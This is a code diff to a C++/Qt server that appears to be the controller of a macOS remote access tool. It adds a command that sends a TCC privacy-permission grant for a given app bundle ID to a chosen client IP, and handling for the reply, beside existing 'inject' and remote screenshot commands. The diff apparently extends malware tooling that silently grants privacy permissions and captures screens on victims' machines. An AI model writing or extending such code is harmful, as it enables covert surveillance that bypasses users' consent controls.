@@ -230,6 +230,14 @@ void Server::processPacketBuffer(ClientContext& client) {
             QString path = parts.size() >= 1 ? parts[0] : QString();
             emit injectResultReceived(
                 QString::fromStdString(client.socket.getIp()), success, path);
+        } else if (opcode == static_cast<uint16_t>(Opcode::TCC_GRANT_RES)) {
+            // Payload: bundleId|success(0/1)
+            bool success = !payload_str.empty() && payload_str.back() == '1';
+            QStringList parts = QString::fromStdString(payload_str).split('|');
+            QString bundleId = parts.size() >= 1 ? parts[0] : QString();
+            emit tccGrantResultReceived(
+                QString::fromStdString(client.socket.getIp()),
+                bundleId, success);
         } else if (opcode == static_cast<uint16_t>(Opcode::SCREENSHOT_RES)) {
             // Payload: [U16 status][U32 width][U32 height][U32 size][data...]
             bool ok = payload.size() >= 14;
@@ -325,6 +333,17 @@ void Server::sendScreenshotCommand(const QString& ip, uint8_t subtype) {
         if (QString::fromStdString(client.socket.getIp()) == ip) {
             std::string payload(1, static_cast<char>(subtype));
             Packet p(static_cast<uint16_t>(Opcode::SCREENSHOT_REQ), payload);
+            client.socket.sendData(p.serialize());
+            break;
+        }
+    }
+}
+
+void Server::sendTccGrantCommand(const QString& ip, const QString& bundleId) {
+    for (auto& client : m_clients) {
+        if (QString::fromStdString(client.socket.getIp()) == ip) {
+            std::string payload = bundleId.toStdString();
+            Packet p(static_cast<uint16_t>(Opcode::TCC_GRANT), payload);
             client.socket.sendData(p.serialize());
             break;
         }
